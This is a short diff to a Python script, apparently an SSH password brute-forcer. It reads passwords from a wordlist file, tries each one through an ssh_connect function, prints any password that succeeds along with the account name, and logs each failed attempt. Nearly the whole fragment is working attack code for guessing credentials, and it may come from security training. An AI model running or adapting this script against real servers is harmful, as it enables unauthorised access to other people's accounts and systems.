@@ -27,8 +27,20 @@ if os.path.exists(input_file) == False:
     print('[!!] File doesnt exist in directory/path')
     sys.exit(1)
 
+    
 with open(input_file, 'r') as file:
     for line in file.readlines():
         password = line.strip()
         try:
             response = ssh_connect(password)
+            if response == 0:
+                print(termcolor.colored(('[+] Found password!! ' + password + ', for account: '+ username), 'green'))
+                break
+            elif response == 1:
+                print('[-] incorrect login: '+ password)
+            elif response == 2:
+                print('[!!] Cant connect')
+                sys.exit(1)
+        except Exception as e:
+            print(e)
+            pass
